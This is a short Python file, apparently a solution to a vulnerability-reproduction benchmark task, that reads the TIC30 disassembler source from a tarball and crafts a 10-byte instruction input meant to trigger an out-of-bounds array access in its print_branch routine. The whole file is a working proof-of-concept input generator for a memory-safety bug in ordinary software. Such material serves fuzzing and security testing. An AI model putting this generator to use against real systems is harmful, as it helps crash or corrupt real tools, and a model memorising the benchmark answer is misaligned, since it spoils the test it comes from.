import tarfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        tic30_code = ""
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('tic30-dis.c'):
                        f = tar.extractfile(member)
                        if f:
                            tic30_code = f.read().decode('utf-8', errors='ignore')
                        break
        except Exception:
            pass

        # Default fallback values (standard TIC30 branch)
        target_opcode = 0x60000000
        target_mask = 0xFF000000

        if tic30_code:
            # Locate an entry in the opcode table that uses print_branch
            # Format typically: { "name", opcode, mask, print_branch, ... }
            matches = re.findall(r'\{\s*"[^"]+"\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*(0x[0-9a-fA-F]+)\s*,\s*print_branch', tic30_code)
            if matches:
                target_opcode = int(matches[0][0], 16)
                target_mask = int(matches[0][1], 16)

        # Construct payload:
        # The vulnerability involves an array overrun in print_branch where operand[2] is accessed/written
        # but the array is sized [2]. This typically happens when extracting the 3rd byte of operands.
        # We set all non-masked bits to 1 to ensure any extracted operand values are non-zero/maximized,
        # triggering the specific code path and the overflow.
        payload_val = target_opcode | ((~target_mask) & 0xFFFFFFFF)

        # Determine endianness (TIC30 tools usually default to little endian, but check source)
        is_big_endian = False
        if tic30_code:
            if "bfd_getb32" in tic30_code and "bfd_getl32" not in tic30_code:
                is_big_endian = True
        
        if is_big_endian:
            inst_bytes = struct.pack('>I', payload_val)
        else:
            inst_bytes = struct.pack('<I', payload_val)

        # Ground truth length is 10 bytes. 
        # Provide 2 full instructions + 2 bytes padding to satisfy length and potential lookahead.
        return inst_bytes * 2 + inst_bytes[:2]